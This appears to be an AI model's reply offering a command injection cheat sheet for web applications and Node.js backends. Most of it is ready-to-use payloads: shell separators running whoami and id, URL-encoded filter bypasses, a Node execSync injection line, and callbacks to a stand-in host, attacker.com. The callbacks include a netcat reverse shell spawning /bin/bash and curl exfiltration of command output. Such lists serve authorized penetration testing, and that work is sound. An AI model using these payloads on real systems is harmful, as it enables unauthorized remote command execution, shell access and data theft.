Here’s a **Command Injection Testing Cheat Sheet** tailored for **web applications (including those running JavaScript on the backend like Node.js)**. These payloads help identify unsanitized input that's being passed to system commands.

---

### 🔍 **Basic Command Injection Payloads**

Start with simple inputs to check if they're interpreted as commands:

```bash
; whoami
&& whoami
| whoami
`whoami`
$(whoami)
```

**Examples in parameters or fields:**
```
127.0.0.1; whoami
test && id
name=Kolbe|uname -a
```

---

### 💣 **Dangerous Payloads for Confirming Exploitability**

> **Only use with permission in a legal environment (e.g. your own pentest lab)**

```bash
; sleep 10
&& ping -c 4 attacker.com
| nc attacker.com 4444 -e /bin/bash
$(curl http://attacker.com/`whoami`)
```

---

### 🧪 **Blind Injection Indicators**

These help detect when you can’t see output but can infer injection via time or DNS:

```bash
; ping -c 3 127.0.0.1
; sleep 5
; curl http://attacker.com
; nslookup kolbe.attacker.com
```

---

### 🧼 **Bypass Filters and Encoding Tricks**

To evade basic filtering or blacklisting:

- Use encoded input:
  ```
  %26%26 whoami        # URL-encoded '&& whoami'
  %3B whoami           # URL-encoded '; whoami'
  ```
- Use shell-wrapped input:
  ```
  $(id)
  `id`
  ```

---

### 🧠 **Context-Specific Tricks (Node.js/JavaScript)**

If you suspect **Node.js** is using `child_process.exec()` or `execSync()`:

```javascript
; require('child_process').execSync('whoami')  // JS injection + RCE
```

Or test with payloads like:
```
a$(whoami)
a`whoami`
a|id
```

---

### 🛡️ **Things to Observe**

- Does the response change with your input?
- Is there a delay (try `sleep`)?
- Do you get unusual error messages or stack traces?
- Are there DNS or HTTP callbacks if you set them up?

---

Would you like me to generate a simple vulnerable Node.js app to practice these on?